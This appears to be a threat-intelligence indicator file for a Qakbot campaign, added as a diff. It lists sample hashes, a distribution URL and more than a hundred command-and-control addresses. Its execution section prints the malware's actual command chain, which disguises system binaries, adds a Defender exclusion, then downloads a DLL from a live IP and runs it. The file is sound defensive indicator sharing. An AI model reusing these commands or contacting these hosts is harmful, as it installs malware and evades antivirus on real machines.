@@ -1,0 +1,171 @@
+28.02.2023 | Qakbot | BB17 | Campaign 1677576236 | Version 404.9
+
+*************************************************
+
+.html 18dce3f481464289d20055c3d7af7b703d54fd850084ed4c71d4124a79aa1fba - BorisUX.html
+.zip 82fbd13e8e660f10904cbb23064cb41530e0469147f6fc07dd33e180b5842cd5 - pw = 764
+.img 6edded3fcbe82400d74f5c47591eba7837bf46854d697da762bf5b3f174474a5
+.dll 628b7be2f1bb39f173458d0595ddfed907157ef25a574d34faaa4bfd80129071
+
+*************************************************
+
+Exec
+
+cmd /c Patroullart.lnk
+
+athanasianistDimercurion.exe /C "Proteroglyph || AzotemiaBahadur || JaperyRibaldry\Rhododaphne\TrevetChipboard.cmd protandry StarthroatMonophase strombus TrachenchymaReintroduced || monomyarianInterjoinder || coupler"
+
+cmd.exe  /S /D /c" echo f"
+
+xcopy  C:\Windows\\\\\\system32\\\\\\wscript.exe C:\Users\Admin\AppData\Local\Temp\waffedInnominables.exe /h /s /e
+
+cmd.exe  /S /D /c" echo f"
+
+xcopy  C:\Windows\\\\\\system32\\\\\\reg.exe C:\Users\Admin\AppData\Local\Temp\glanduleHoratory.exe /h /s /e
+
+glanduleHoratory.exe import JaperyRibaldry\Rhododaphne\Landless.JiQn
+
+waffedInnominables.exe JaperyRibaldry\Rhododaphne\ShallopLangspiel.wsf
+
+powershell.exe" $Pissant = Get-ItemProperty -Path HKCU:\SOFTWARE\Pissant | %{$_.deforce}; powershell -windowstyle Minimized -encodedcommand "JABjAHIAbwBuA$Pissant"
+
+$cronel = Get-ItemProperty -Path HKCU:\\SOFTWARE\\cumbre | %{$_.deforce}; $cronel = "mutterer" + $cronel; [Reflection.Assembly]::Load([Convert]::fromBase64String($cronel)); [classicyc1]::Execute("powershell -executionpolicy bypass -windowstyle hidden ""`$currentDrive = `(get-location`).Drive.Name + ':\'; Add-MpPreference -ExclusionPath `$currentDrive;Start-Sleep -Seconds 10;reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Userinit /f; reg delete HKEY_CURRENT_USER\SOFTWARE\cumbre /v deforce /f""");Start-Sleep -Seconds 10;Invoke-WebRequest http://142.93.76.59/Xrnn3nI/28 -O $env:TEMP\StrangulatorySubduedness.dll; rundll32 $env:TEMP\\StrangulatorySubduedness.dll,N115;
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\StrangulatorySubduedness.dll,N115
+
+cmd.exe /c start https://learn.microsoft.com/microsoft-365/troubleshoot/
+
+*************************************************
+
+distro urls
+
+http://142.93.76.59/Xrnn3nI/28/StrangulatorySubduedness.dll
+
+
+*************************************************
+
+
+*************************************************
+
+c2's
+
+73.165.119.20:443
+80.13.205.69:2222
+202.142.98.62:995
+14.192.241.76:995
+90.104.22.28:2222
+74.92.243.113:50000
+184.155.91.69:443
+12.172.173.82:990
+47.34.30.133:443
+73.161.176.218:443
+27.0.48.233:443
+188.49.116.2:995
+24.239.69.244:443
+12.172.173.82:21
+92.239.81.124:443
+84.35.26.14:995
+91.165.188.74:50000
+12.172.173.82:465
+172.248.42.122:443
+103.140.174.19:2222
+70.160.80.210:443
+2.13.73.146:2222
+2.98.146.106:995
+213.67.255.57:2222
+172.90.139.138:2222
+72.80.7.6:50003
+59.28.84.65:443
+87.223.83.119:443
+190.191.35.122:443
+47.21.51.138:443
+116.74.164.35:443
+72.80.7.6:995
+35.143.97.145:995
+161.142.102.110:995
+103.123.223.168:443
+125.99.69.178:443
+116.72.250.18:443
+76.170.252.153:995
+92.27.86.48:2222
+103.141.50.102:995
+202.142.98.62:443
+89.129.109.27:2222
+71.31.101.183:443
+98.145.23.67:443
+75.158.15.211:443
+86.225.214.138:2222
+12.172.173.82:2087
+103.111.70.115:995
+82.127.204.82:2222
+103.212.19.254:995
+92.154.17.149:2222
+2.50.47.74:443
+88.171.156.150:50000
+37.189.253.91:443
+92.154.45.81:2222
+201.244.108.183:995
+46.27.231.50:2078
+82.212.111.19:443
+73.22.121.210:443
+85.59.61.52:2222
+47.21.51.138:995
+213.31.90.183:2222
+27.109.19.90:2078
+184.176.35.223:2222
+50.68.186.195:443
+69.133.162.35:443
+118.250.180.74:995
+103.252.7.231:443
+12.172.173.82:50001
+151.65.177.218:443
+180.151.104.240:443
+86.190.223.11:2222
+86.130.9.136:2222
+31.166.48.125:995
+119.155.246.94:995
+47.196.225.236:443
+86.195.14.72:2222
+75.98.154.19:443
+50.68.204.71:993
+114.143.176.235:443
+27.0.48.205:443
+103.144.201.53:2078
+167.56.52.254:995
+103.111.70.115:443
+87.202.101.164:50000
+49.245.82.178:2222
+212.69.141.168:995
+136.244.25.165:443
+80.47.61.240:2222
+50.68.204.71:995
+124.122.56.144:443
+198.2.51.242:993
+86.250.10.160:2222
+147.219.4.194:443
+77.124.9.203:443
+109.149.147.104:2222
+86.202.48.142:2222
+76.80.180.154:995
+104.35.24.154:443
+73.36.196.11:443
+84.215.202.22:443
+12.172.173.82:32101
+77.86.98.236:443
+81.229.117.95:2222
+93.147.134.85:443
+176.142.207.63:443
+202.186.177.88:443
+92.186.69.229:2222
+66.191.69.18:995
+64.237.251.199:443
+186.64.87.213:443
+108.190.203.42:995
+49.175.72.56:443
+50.68.204.71:443
+75.143.236.149:443
+174.104.184.149:443
+72.203.216.98:2222
+197.92.136.122:443
+122.184.143.82:443
+
